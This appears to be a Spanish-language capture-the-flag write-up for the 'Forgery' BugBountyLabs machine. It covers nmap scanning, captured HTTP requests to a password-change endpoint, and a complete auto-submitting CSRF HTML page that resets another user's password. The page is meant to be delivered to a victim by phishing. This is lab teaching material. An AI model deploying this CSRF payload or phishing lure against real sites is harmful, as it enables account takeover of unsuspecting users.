---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Forgery BugBountyLabs (Principiante)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bugbountylabs_forgery.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
python3 bugbountylabs_forgery.py
```

Info:

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ██╗      █████╗ ██████╗ ███████╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██║     ██╔══██╗██╔══██╗██╔════╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     ██║     ███████║██████╔╝███████╗
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██║     ██╔══██║██╔══██╗╚════██║
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ███████╗██║  ██║██████╔╝███████║
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝

Fundadores
El Pingüino de Mario
Curiosidades De Hackers

Cofundadores
Zunderrub
CondorHacks
Lenam

Descargando la máquina forgery, espere por favor...

[########################################] 100%
Descarga completa.
La IP de la máquina forgery es -> 172.17.0.2

Presiona Ctrl+C para detener la máquina
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 06:46 EDT
Nmap scan report for 192.168.1.150
Host is up (0.00038s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.62
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 4.8K  2025-01-05 11:08  app.py
| 562   2025-01-05 10:53  malicious.html
| 2.9K  2025-01-05 11:20  nohup.out
| -     2025-01-05 11:01  static/
| 723   2025-01-05 11:01  static/style.css
| -     2025-01-05 11:05  templates/
| 12K   2025-01-05 11:19  users.db
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.62 (Debian)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.11.2
|     Date: Thu, 20 Mar 2025 10:46:15 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 806
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Home</title>
|     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
|     <link rel="stylesheet" href="/static/style.css">
|     </head>
|     <body>
|     <div class="container text-center mt-5">
|     class="mb-4">Bienvenido a la Aplicaci
|     n</h1>
|     class="lead">Gestiona usuarios, inicia sesi
|     strate para empezar.</p>
|     <div class="d-flex justify-content-center gap-3 mt-4">
|     href="/login" class="btn btn-primary btn-lg">Iniciar Sesi
|     n</a>
|     href="/register" class="btn
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=3/20%Time=67DBF1F8%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,3D4,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\
SF:x20Python/3\.11\.2\r\nDate:\x20Thu,\x2020\x20Mar\x202025\x2010:46:15\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20806\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
SF:g=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x2
SF:0\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x2
SF:0initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Home</title>\n\x20\x20\x
SF:20\x20<link\x20href=\"https://cdn\.jsdelivr\.net/npm/bootstrap@5\.3\.0-
SF:alpha3/dist/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\x20\x20\
SF:x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/style\.css\">\n</h
SF:ead>\n<body>\n\x20\x20\x20\x20<div\x20class=\"container\x20text-center\
SF:x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"mb-4\">Bienv
SF:enido\x20a\x20la\x20Aplicaci\xc3\xb3n</h1>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<p\x20class=\"lead\">Gestiona\x20usuarios,\x20inicia\x20sesi\xc3\x
SF:b3n\x20o\x20reg\xc3\xadstrate\x20para\x20empezar\.</p>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<div\x20class=\"d-flex\x20justify-content-center\x20ga
SF:p-3\x20mt-4\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20h
SF:ref=\"/login\"\x20class=\"btn\x20btn-primary\x20btn-lg\">Iniciar\x20Ses
SF:i\xc3\xb3n</a>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20h
SF:ref=\"/register\"\x20class=\"btn")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML
SF:>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x2
SF:0\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\(
SF:'RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x
SF:20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsuppo
SF:rted\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
MAC Address: 08:00:27:92:CC:FA (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.10 seconds
```

Vemos varios puertos, entre ellos uno que es el `80` y el otro el `5000` que podemos deducir que son `2` servidores en los que alojan una pagina web.

Si entramos en el puerto `80` veremos una serie de archivos:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que en este puerto esta alojado un servidor de `python` que esta corriendo en el puerto `5000`, por lo que esto ya de primeras es un fallo, ya que podremos ver como esta compuesto a nivel de codigo.

Si nos metemos en el puerto `5000` veremos un `login`, en el que nos podremos registrar, vamos a crear una cuenta e iniciaremos sesion dentro de la pagina web, una vez dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si le damos a `cambiar contraseña` veremos que podemos elegir el `ID` que queramos y la nueva contraseña por lo que esto podria ser atacado con un `CSRF` ya que tambien vemos que admite un metodo `GET` mediante la `URL` si capturamos la peticion con `BurpSuite` veremos lo siguiente:

```
POST /change-password HTTP/1.1
Host: 192.168.1.150:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://192.168.1.150:5000
Connection: keep-alive
Referer: http://192.168.1.150:5000/change-password
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImRpc2VvIn0.Z9v37Q.DdNvpPz5rUrk9nDouo0cQZTsdYM
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user_id=1&new_password=1234
```

Pero si lo cambiamos a `GET`:

```
GET /change-password?user_id=1&new_password=1234 HTTP/1.1
Host: 192.168.1.150:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://192.168.1.150:5000
Connection: keep-alive
Referer: http://192.168.1.150:5000/change-password
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImRpc2VvIn0.Z9v37Q.DdNvpPz5rUrk9nDouo0cQZTsdYM
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Veremos que tambien se puede y no esta validando la entrada de la `URL`, por lo que podremos poner cualquier `ID` y se le cambiaria la contraseña a dicho usuario, podriamos crearnos esta pagina maliciosa:

```html
<html>
  <body>
    <h1>¡Felicidades! Has ganado un premio!</h1>
    <p>Haz clic aquí para obtener tu premio.</p>
    <!-- Formulario malicioso que envía un POST a /change-password -->
    <form id="csrf_form" action="http://localhost:5000/change-password" method="POST">
      <!-- Parámetros ocultos para el cambio de contraseña -->
      <input type="hidden" name="user_id" value="1"> <!-- ID de usuario objetivo -->
      <input type="hidden" name="new_password" value="newpassword123"> <!-- Nueva contraseña -->
      <input type="submit" value="Cambiar contraseña">
    </form>

    <script>
      // El formulario se envía automáticamente sin que el usuario lo sepa
      document.getElementById('csrf_form').submit();
    </script>
  </body>
</html>
```

Alojarlo en algun servidor nuestro como atacante y enviarselo mediante `pishing` a la victima para que se le cambie la contraseña en dicha pagina, con el `ID` de usuario que queramos.

Si probamos a crear otro usuario para tener `2` usuarios y desde el usuario `1` probamos a meter el `ID` numero `2` para cambiar dicha contraseña desde la `URL` veremos que funciona, por lo que podremos realizar un `CSRF` al usuario `admin` si estuviera en la pagina.

Con esto ya habremos terminado la maquina, ya que explotamos de forma correcta dicha vulnerabilidad.
